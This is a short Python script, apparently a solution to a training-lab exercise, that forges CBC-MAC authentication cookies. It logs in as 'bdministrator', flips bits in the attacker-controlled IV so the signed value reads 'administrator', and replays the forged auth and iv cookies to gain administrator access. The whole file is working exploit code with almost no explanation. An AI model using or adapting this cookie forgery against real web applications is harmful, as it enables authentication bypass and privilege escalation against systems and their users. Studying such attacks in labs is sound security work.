import base64
import itertools
import requests
import urllib

'''
This is script for tampering CBC-MAC signature with specific IV which is controlled by an attacker.
'''

url = 'http://ptl-904eb197-89a1741f.libcurl.so/'

username1 = 'bdministrator'
username2 = 'administrator'

res1 = requests.post(url + 'login.php',
                     data = {'username': username1, 'password': 'Password1'},
                     headers = {'Content-Type': 'application/x-www-form-urlencoded'},
                     allow_redirects = False)

print ("Received cookies for username '" + username1  + "': auth=" + res1.cookies['auth'] + "; iv=" + res1.cookies['iv'])
print

iv1_urlencoded = res1.cookies['iv']
iv1 = base64.b64decode(urllib.unquote(iv1_urlencoded))

def xor(s1, s2):
    max_len = max(len(s1), len(s2))
    s1 += chr(0) * (max_len - len(s1))
    s2 += chr(0) * (max_len - len(s2))
    return ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(s1, s2)])

# New Initial Vector iv2 = username1[:8] ^ username2[:8] ^ iv1
iv2 = xor(iv1, xor(username1[:8], username2[:8]))
iv2_b64 = base64.b64encode(iv2)

new_cookies = dict(auth = urllib.quote(base64.b64encode(username2[:8] + base64.b64decode(urllib.unquote(res1.cookies['auth']))[8:])),
                   iv = urllib.quote(iv2_b64))
print "New cookies: " + str(new_cookies)
print

url2 = url + 'index.php'
res2 = requests.get(url2, cookies = new_cookies)
print "Response: "
print
print res2.text
